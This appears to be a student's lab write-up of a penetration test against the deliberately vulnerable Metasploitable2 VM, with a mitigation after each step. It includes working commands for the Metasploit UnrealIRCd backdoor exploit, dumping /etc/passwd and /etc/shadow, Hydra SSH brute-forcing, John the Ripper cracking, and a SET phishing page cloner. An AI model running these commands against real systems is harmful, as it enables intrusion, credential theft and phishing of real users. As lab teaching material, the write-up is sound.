# Task-4-
# Exploitation & System Security

## Overview
The primary objective of this project is to execute a full penetration testing workflow — from reconnaissance through exploitation, post-exploitation, password attacks, and social engineering simulation — against Metasploitable2 in a controlled lab environment, followed by malware analysis and system hardening to remediate identified weaknesses.

---

## Technical Stack & Tools Used
* **Operating System (Attacker):** Kali Linux
* **Target System:** Metasploitable2 (intentionally vulnerable Linux VM)
* **Exploitation Framework:** Metasploit Framework (`msfconsole`)
* **Password Attack Tools:** Hydra, John the Ripper
* **Social Engineering Tool:** Social-Engineering Toolkit (SET)
* **Malware Analysis:** `strings`, `file`, `md5sum`, sandboxed VM environment
* **Network Scanning:** Nmap
* **Hardening Tools:** UFW (Uncomplicated Firewall), systemd service management

---

## Exploitation Scenarios & Remediation

### 1. Penetration Testing Methodology
* **Approach:** Followed the standard PTES workflow — Recon → Scanning → Exploitation → Post-Exploitation → Reporting — documenting each phase with command output and screenshots.
* **Recon:** Identified live services and versions on the target using Nmap.
  ```bash
  nmap -sV -p 6667 192.168.56.101
  ```
* **Finding:** Port 6667 running `UnrealIRCd`, vulnerable to a known unauthenticated backdoor (CVE-2010-2075).

### 2. Exploitation with Metasploit
* **Exploitation:** Used Metasploit's UnrealIRCd backdoor module to gain an unauthenticated remote command shell on the target.
  ```bash
  msfconsole
  search unrealircd
  use exploit/unix/irc/unreal_ircd_3281_backdoor
  set RHOSTS 192.168.56.101
  set LHOST 192.168.56.102
  exploit
  ```
* **Post-Exploitation:**
  ```bash
  whoami
  id
  uname -a
  cat /etc/passwd > passwd_dump.txt
  cat /etc/shadow > shadow_dump.txt
  ```
* **Mitigation:** Patch/upgrade `UnrealIRCd` to a current, non-backdoored release; restrict IRC service exposure via firewall rules; disable the service entirely if unused.

### 3. Password Attacks
* **Brute-Force (Hydra):** Performed a dictionary-based brute-force attack against the target's SSH service.
  ```bash
  hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.101
  ```
  * **Result:** Valid credentials recovered — `msfadmin:msfadmin`.
* **Hash Cracking (John the Ripper):** Cracked password hashes extracted from the compromised system.
  ```bash
  unshadow passwd_dump.txt shadow_dump.txt > combined.txt
  john combined.txt --wordlist=/usr/share/wordlists/rockyou.txt
  john --show combined.txt
  ```
* **Mitigation:** Enforce strong, unique password policies; disable or change default credentials; implement account lockout thresholds and rate-limiting on SSH (e.g., `fail2ban`).

### 4. Social Engineering (Simulation Only)
* **Exploitation:** Cloned a test login page using the Social-Engineering Toolkit's Credential Harvester to simulate a phishing attack, confined entirely to the isolated lab network.
  ```bash
  sudo setoolkit
  # 1) Social-Engineering Attacks
  # 2) Website Attack Vectors
  # 3) Credential Harvester Attack Method
  # 2) Site Cloner
  ```
* **Result:** Captured test credentials submitted to the cloned page, demonstrating how unsuspecting users could be deceived.
* **Mitigation:** User awareness training covering mismatched URLs, missing HTTPS, urgency-based language, generic greetings, and unsolicited credential requests.

### 5. Malware Basics
* **Static Analysis:** Examined a benign test sample without execution to identify file type and embedded strings.
  ```bash
  file sample.bin
  strings sample.bin
  md5sum sample.bin
  ```
* **Dynamic Analysis:** Executed the sample within an isolated sandbox VM and monitored behavioral changes (file system, network activity).
* **Mitigation:** Maintain updated endpoint protection, restrict execution of unverified binaries, and analyze suspicious files in isolated environments before deployment.

### 6. System Hardening
* **Security Audit:** Reviewed exposed services and firewall configuration on the target system.
  ```bash
  netstat -tulpn
  ufw status
  ```
* **Server Configuration:** Hardened the system by enabling the firewall, restricting access, and disabling unnecessary services.
  ```bash
  sudo ufw enable
  sudo ufw deny from <attacker-ip>
  sudo systemctl disable <unused-service>
  ```

---
